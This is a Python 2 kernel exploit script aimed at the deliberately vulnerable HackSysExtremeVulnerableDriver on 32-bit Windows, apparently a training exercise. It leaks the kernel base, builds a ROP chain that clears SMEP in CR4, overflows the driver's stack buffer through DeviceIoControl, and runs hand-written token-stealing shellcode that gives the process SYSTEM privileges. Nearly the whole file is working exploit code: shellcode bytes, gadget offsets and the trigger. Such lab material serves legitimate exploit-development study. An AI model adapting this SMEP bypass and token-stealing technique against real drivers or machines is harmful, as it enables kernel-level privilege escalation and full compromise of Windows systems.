
from cpuid import CPUID
from ctypes import wintypes
import sys
from ctypes import *

import struct
import os


GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
GENERIC_EXECUTE = 0x20000000
GENERIC_ALL = 0x10000000
FILE_SHARE_DELETE = 0x00000004
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
CREATE_NEW = 1
CREATE_ALWAYS = 2
OPEN_EXISTING = 3
OPEN_ALWAYS = 4
TRUNCATE_EXISTING = 5

c_ulong_array = c_ulong * 1024
lpImageBase = c_ulong_array()
szDriver = c_ulong_array()
cb = sizeof(lpImageBase)
lpcbNeeded = c_long()

#"TIENE SMEP?"
q=CPUID()
smep=q(7)[1] & 0x80

if smep==0:
    print "SMEP DISABLED script not supported"
else:
    print "SMEP ENABLED script supported"


    res = windll.psapi.EnumDeviceDrivers(byref(lpImageBase),
                                         sizeof(lpImageBase),
                                         byref(lpcbNeeded))
    if not res:
        print "(-) unable to get kernel base: " + FormatError()
        sys.exit(-1)

    # nt is the first one
    nt = lpImageBase[0]

    raw_input("zzz")

    print " KERNEL BASE =" + hex(nt)

    ret = struct.pack("<I", nt + 0x8b196)  #0x48b1ce

    # --[ setup]
    shellcode = "\x5d\x90\x90\x90"

    # --[ setup]
    shellcode += "\x60"  # pushad
    shellcode += "\x64\xa1\x24\x01\x00\x00"  # mov eax, fs:[KTHREAD_OFFSET]

    # I have to do it like this because windows is a little special
    # this just gets the EPROCESS. Windows 7 is 0x50, now its 0x80.
    shellcode += "\x8d\x40\x70"  # lea eax, [eax+0x70];
    shellcode += "\x8b\x40\x10"  # mov eax, [eax+0x10];
    shellcode += "\x89\xc1"  # mov ecx, eax (Current _EPROCESS structure)

    # win 10 rs2 x86 TOKEN_OFFSET = 0xfc
    # win 07 sp1 x86 TOKEN_OFFSET = 0xf8
    shellcode += "\x8B\x98\xfc\x00\x00\x00"  # mov ebx, [eax + TOKEN_OFFSET]

    # --[ copy system PID token]
    shellcode += "\xba\x04\x00\x00\x00"  # mov edx, 4 (SYSTEM PID)
    shellcode += "\x8b\x80\xb8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
    shellcode += "\x2d\xb8\x00\x00\x00"  # sub eax, FLINK_OFFSET           |
    shellcode += "\x39\x90\xb4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
    shellcode += "\x75\xed"  # jnz                           ->|

    # win 10 rs2 x86 TOKEN_OFFSET = 0xfc
    # win 07 sp1 x86 TOKEN_OFFSET = 0xf8
    shellcode += "\x8b\x90\xfc\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
    shellcode += "\x89\x91\xfc\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx

    # --[ recover]
    shellcode += "\x61"  # popad
    shellcode += "\x31\xc0"  # return NTSTATUS = STATUS_SUCCESS
    shellcode += "\xc2\x08\x00"  # ret

    IOCTL_STACK=0x222027

    hDevice = windll.kernel32.CreateFileA(r"\\.\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, None )

    print int(hDevice)

    buf = windll.kernel32.VirtualAlloc(0x0,0x824,0x3000,0x40)


    input = struct.pack("<I", nt + 0x519770) *2 # ret
    input += struct.pack("<I", nt + 0x11fc10)  # mov eax, cr4 - ret
    input += struct.pack("<I", nt + 0x51976f)  # pop ecx; ret
    input += struct.pack("<I", 0xFFEFFFFF)  # to disable smep
    input += struct.pack("<I", nt + 0x50095c)  # and eax,ecx; ret
    input += struct.pack("<I", nt + 0x11fc1e)  # mov cr4,eax; ret
    input += struct.pack("<I", int(buf))   # a shellcode




    data=shellcode+ ((0x828 -len(shellcode)) * "A") + struct.pack("<I", nt + 0x51976f)  +struct.pack("<L",int(buf)+0x82c)+ input +struct.pack("<L",0x0BAD0B0B0 )

    windll.kernel32.RtlMoveMemory(c_int(buf),data,c_int(len(data)))

    bytes_returned = wintypes.DWORD(0)
    h=wintypes.HANDLE(hDevice)
    b=wintypes.LPVOID(buf)
    windll.kernel32.DeviceIoControl(h,IOCTL_STACK, b, -1, None, 0, pointer(bytes_returned),0)

    windll.kernel32.CloseHandle(hDevice)
    os.system(r"cmd /k notepad.exe")
